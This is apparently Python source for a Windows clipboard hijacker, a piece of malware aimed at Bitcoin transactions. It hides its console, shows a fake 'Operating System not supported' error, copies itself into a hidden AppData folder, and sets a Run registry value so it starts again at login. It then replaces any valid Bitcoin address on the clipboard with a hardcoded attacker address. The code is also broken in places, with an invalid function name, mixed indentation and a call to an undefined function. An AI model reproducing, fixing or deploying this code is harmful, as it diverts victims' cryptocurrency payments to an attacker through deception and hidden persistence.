import clipboard,coinaddr,threading,time,random,string,os,shutil,sys
import winreg as winzoz
from hashlib import sha256
import win32gui, win32con,ctypes



R1 = "1337leetaddress"

No = r"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run"

#DIR PATH OF THE FOLDER YOU'RE GOING TO CREATE INSIDE %Appdata% 
dir_path = '%s\\wndef\\' % os.environ['APPDATA']



'''
Function that hides the Windows Console when running the script
'''
def P1s():
	try:
		hide = win32gui.GetForegroundWindow()
		win32gui.ShowWindow(hide , win32con.SW_HIDE)
	except:
		sys.exit()

'''
Checks if the program is running first time
'''
def firstBoot(dir_path):
	checkvar = os.path.exists(dir_path)
	if(checkvar == True):
		return True
	elif(checkvar == False):
		return False


'''
Functions that check if a string is a valid BTC Address ( copy-pasted from Rosettacode )
'''
digits58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
def decode_base58(bc, length):
    n = 0
    for char in bc:
        n = n * 58 + digits58.index(char)
    return n.to_bytes(length, 'big')
def check_bc(bc):
    try:
        bcbytes = decode_base58(bc, 25)
        return bcbytes[-4:] == sha256(sha256(bcbytes[:-4]).digest()).digest()[:4]
    except Exception:
        return False



'''
Function that creates and sets the value of a registry key for us
'''
def set_run_key(key, value):
    reg_key = winzoz.OpenKey(
        winzoz.HKEY_CURRENT_USER,
        No,
        0, winzoz.KEY_SET_VALUE)

    with reg_key:
        if value is None:
            winzoz.DeleteValue(reg_key, key)
        else:
            if '%' in value:
                var_type = winzoz.REG_EXPAND_SZ
            else:
                var_type = winzoz.REG_SZ
            winzoz.SetValueEx(reg_key, key, 0, var_type, value)

''' 
Function that creates a directory in the supplied input
'''
def 21m(dir_path):
	if not os.path.exists(dir_path):
		os.makedirs(dir_path)


def s1():
	
	21m(dir_path)
	
	dodgyfilename = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 12)) 
	copied_script_name = os.path.basename(__file__)
        shutil.copy(__file__,  dir_path + copied_script_name) 
	clonepath = '"' + dir_path + copied_script_name + '"'
	return clonepath


def setup():
	P1s()
	firstBootCheck = firstBoot(dir_path)
	if(firstBootCheck == False):
		message = "Operating System not supported."
		ctypes.windll.user32.MessageBoxW(None, message, u"Fatal Error", 0)
		path = s1()
		
		time.sleep(4)
		set_run_key('wndef',path)
		time.sleep(4)
	        else:
		pass



def ggbt():
	threading.Timer(5.0, getclipboard).start()
	clippednow = clipboard.paste()
	isvalid = check_bc(clippednow)
	if( isvalid == True):
		clipboard.copy(R1)


if __name__ == "__main__":
	setup()
	ggbt()
